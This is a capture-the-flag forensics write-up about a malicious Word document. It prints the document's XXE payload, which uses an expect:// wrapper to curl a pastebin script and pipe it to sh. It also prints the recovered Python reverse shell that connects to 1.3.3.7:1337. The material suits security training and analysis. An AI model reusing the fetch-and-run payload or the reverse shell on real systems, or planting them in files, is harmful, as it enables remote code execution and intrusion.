# Out of Office - Forensics - 328 points - 40 solves
> While everyone was out on sick leave, someone took the opportunity to pwn our
> servers, since nobody was around to keep an eye out for sketchy emails. We
> traced the hack back to one user's computer, this document was the only thing
> out of place...
### Files
- [hacked.docx](hacked.docx)

Docx files are simply zip files containing xml files so we can unzip the docx file using `unzip hacked.docx -d hacked`. We get a whole bunch of files but one can predict that the content will be in customXml/ or just keep searching until they get lucky. The file we want to look at is customXml/item1.xml

```xml
<?xml version="1.0" ?>
<!DOCTYPE l33t [
<!ELEMENT l33t ANY [
<!ENTITY % hacktheplanet SYSTEM "expect://curl$IFS'pastebin.com/raw/puTaMkNR$IFS|sh'">%hacktheplanet;]>
<r>&exfil;</r>
```

This xml file is trying to exploit the document reader by running the shell script located at `pastebin.com/raw/puTaMkNR`. If we try visit the site you can see that the page no longer exists. Clearly the pastebin has expired/been deleted so we can't see what would be run. In order to find out what used to be stored on the pastebin we can use the [Internet Archive](https://web.archive.org/web/20200301220511/pastebin.com/raw/puTaMkNR). So the script turns out to be:
```sh
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("1.3.3.7",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' # all the 1337 hackers have a signature right? SGFja1RyaW5pdHl7QWxXQHk1X0MxM2FOX1VwX0BmdDNyX3kwdVJfSEBjazV9Cg==
```

Base64 decode the signature to get the flag: HackTrinity{AlW@y5_C13aN_Up_@ft3r_y0uR_H@ck5}